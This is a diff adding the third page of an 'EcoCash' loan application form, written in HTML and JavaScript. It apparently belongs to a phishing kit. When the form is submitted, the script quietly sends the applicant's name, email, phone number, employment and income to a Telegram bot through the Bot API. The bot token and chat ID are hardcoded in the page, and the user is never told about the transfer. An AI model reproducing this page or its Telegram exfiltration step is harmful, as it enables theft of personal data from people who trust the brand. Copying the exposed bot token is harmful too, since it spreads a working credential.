@@ -1,0 +1,431 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Loan Application</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: #f5f5f5;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .step-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .step-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.3);
+        }
+        
+        .step-dot.active {
+            background: white;
+            transform: scale(1.3);
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        h2 {
+            color: #333;
+            margin-bottom: 5px;
+            font-size: 20px;
+        }
+        
+        .step-number {
+            color: #667eea;
+            font-size: 14px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            display: block;
+        }
+        
+        .section {
+            margin-bottom: 25px;
+        }
+        
+        .section-title {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        
+        .employment-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        
+        .employment-option {
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .employment-option:hover {
+            border-color: #667eea;
+        }
+        
+        .employment-option.selected {
+            border-color: #667eea;
+            background: #f0f3ff;
+        }
+        
+        .income-input {
+            position: relative;
+            margin-top: 15px;
+        }
+        
+        .income-input span {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-weight: bold;
+        }
+        
+        .income-input input {
+            width: 100%;
+            padding: 15px 15px 15px 40px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #f9f9f9;
+        }
+        
+        .summary-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        
+        .summary-table td {
+            padding: 12px 0;
+            border-bottom: 1px solid #eee;
+            color: #555;
+        }
+        
+        .summary-table td:first-child {
+            color: #666;
+            font-weight: bold;
+            width: 40%;
+        }
+        
+        .summary-table td:last-child {
+            text-align: right;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .summary-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 40px;
+        }
+        
+        .btn {
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s;
+        }
+        
+        .btn-prev {
+            background: #f0f0f0;
+            color: #666;
+        }
+        
+        .btn-prev:hover {
+            background: #e0e0e0;
+        }
+        
+        .btn-submit {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            width: 100%;
+        }
+        
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #999;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">EcoCash</div>
+            <h1>Loan Application</h1>
+            <div class="step-indicator">
+                <div class="step-dot"></div>
+                <div class="step-dot"></div>
+                <div class="step-dot active"></div>
+            </div>
+        </div>
+        
+        <div class="content">
+            <span class="step-number">Step 3 of 3</span>
+            <h2>Final Details</h2>
+            
+            <div class="section">
+                <div class="section-title">Employment Status</div>
+                <div class="employment-options">
+                    <div class="employment-option selected" data-status="employed">Employed</div>
+                    <div class="employment-option" data-status="self-employed">Self-Employed</div>
+                    <div class="employment-option" data-status="student">Student</div>
+                    <div class="employment-option" data-status="unemployed">Unemployed</div>
+                </div>
+                
+                <div class="income-input">
+                    <span>$</span>
+                    <input type="number" id="annualIncome" placeholder="50,000" min="0" step="1000">
+                </div>
+            </div>
+            
+            <div class="section">
+                <div class="section-title">Application Summary</div>
+                <table class="summary-table" id="summaryTable">
+                    <!-- Will be populated by JavaScript -->
+                </table>
+            </div>
+            
+            <div class="button-group">
+                <button class="btn btn-prev" onclick="prevStep()">PREVIOUS</button>
+                <button class="btn btn-submit" onclick="submitApplication()">SUBMIT APPLICATION</button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            © 2025 EcoCash
+        </div>
+    </div>
+
+    <script>
+        // Get saved data
+        let applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Employment status
+            document.querySelectorAll('.employment-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    document.querySelectorAll('.employment-option').forEach(o => o.classList.remove('selected'));
+                    this.classList.add('selected');
+                    applicationData.employmentStatus = this.getAttribute('data-status');
+                    localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+                });
+            });
+            
+            // Income
+            document.getElementById('annualIncome').addEventListener('input', function() {
+                applicationData.annualIncome = parseInt(this.value) || 0;
+                localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+                updateSummary();
+            });
+            
+            // Set default values
+            if (!applicationData.employmentStatus) {
+                applicationData.employmentStatus = 'employed';
+            }
+            if (!applicationData.annualIncome) {
+                applicationData.annualIncome = 50000;
+                document.getElementById('annualIncome').value = 50000;
+            }
+            
+            // Update summary table
+            updateSummary();
+        });
+        
+        function updateSummary() {
+            const table = document.getElementById('summaryTable');
+            
+            // Calculate monthly payment (simple calculation)
+            const amount = applicationData.loanAmount || 5000;
+            const term = applicationData.loanTerm || 12;
+            const interestRate = 8; // 8% per year
+            const monthlyRate = interestRate / 100 / 12;
+            const monthlyPayment = (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -term));
+            
+            table.innerHTML = `
+                <tr>
+                    <td>Loan Amount:</td>
+                    <td>$${amount.toLocaleString()}</td>
+                </tr>
+                <tr>
+                    <td>Loan Term:</td>
+                    <td>${term} Months</td>
+                </tr>
+                <tr>
+                    <td>Purpose:</td>
+                    <td>${getPurposeLabel(applicationData.purpose || 'food')}</td>
+                </tr>
+                <tr>
+                    <td>Applicant:</td>
+                    <td>${applicationData.firstName || 'Sunny'} ${applicationData.lastName || 'Manu'}</td>
+                </tr>
+                <tr>
+                    <td>Monthly Payment:</td>
+                    <td>$${monthlyPayment.toFixed(2)}</td>
+                </tr>
+                <tr>
+                    <td>Annual Income:</td>
+                    <td>$${(applicationData.annualIncome || 0).toLocaleString()}</td>
+                </tr>
+            `;
+        }
+        
+        function getPurposeLabel(purpose) {
+            const purposes = {
+                'food': 'Food',
+                'education': 'Education',
+                'medical': 'Medical',
+                'business': 'Business',
+                'emergency': 'Emergency',
+                'other': 'Other'
+            };
+            return purposes[purpose] || 'Food';
+        }
+        
+        function prevStep() {
+            window.location.href = 'application-step2.html';
+        }
+        
+        function submitApplication() {
+            // Validate income
+            const income = document.getElementById('annualIncome').value;
+            if (!income || parseInt(income) < 1000) {
+                alert('Please enter a valid annual income');
+                return;
+            }
+            
+            // Save final data
+            applicationData.employmentStatus = document.querySelector('.employment-option.selected').getAttribute('data-status');
+            applicationData.annualIncome = parseInt(income);
+            applicationData.applicationDate = new Date().toISOString();
+            applicationData.status = 'pending';
+            applicationData.applicationId = 'EC-' + Date.now();
+            
+            // Save to localStorage
+            localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+            
+            // Send to Telegram bot
+            sendToTelegramBot(applicationData);
+            
+            // Redirect to confirmation page
+            window.location.href = 'application-confirmation.html';
+        }
+        
+        function sendToTelegramBot(data) {
+            // Replace with your actual Telegram bot token and chat ID
+            const botToken = '8076358052:AAGvUw1lJsUeJAYK2V8Xf-vz3hn_W1hgWVI';
+            const chatId = '5520957080';
+            
+            // Format the message
+            const message = `
+🎯 *NEW LOAN APPLICATION RECEIVED*
+            
+📋 *Application Details:*
+• ID: ${data.applicationId}
+• Date: ${new Date().toLocaleString()}
+• Status: ${data.status}
+
+👤 *Applicant Information:*
+• Name: ${data.firstName} ${data.lastName}
+• Email: ${data.email}
+• Phone: +263${data.phone}
+• Employment: ${data.employmentStatus}
+• Annual Income: $${data.annualIncome?.toLocaleString() || 'N/A'}
+
+💰 *Loan Details:*
+• Type: ${data.loanType || 'Personal Loan'}
+• Amount: $${data.loanAmount?.toLocaleString() || '5000'}
+• Term: ${data.loanTerm || '12'} months
+• Purpose: ${getPurposeLabel(data.purpose || 'food')}
+• Monthly Payment: $${calculateMonthlyPayment(data.loanAmount || 5000, data.loanTerm || 12).toFixed(2)}
+
+🕒 *Application submitted at:* ${new Date().toLocaleTimeString()}
+            `;
+            
+            // Encode the message for URL
+            const encodedMessage = encodeURIComponent(message);
+            
+            // Send to Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=Markdown`)
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Telegram message sent:', result);
+                })
+                .catch(error => {
+                    console.error('Error sending to Telegram:', error);
+                });
+        }
+        
+        function calculateMonthlyPayment(amount, term) {
+            const interestRate = 8; // 8% per year
+            const monthlyRate = interestRate / 100 / 12;
+            return (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -term));
+        }
+    </script>
+</body>
+</html>
+[file content end]
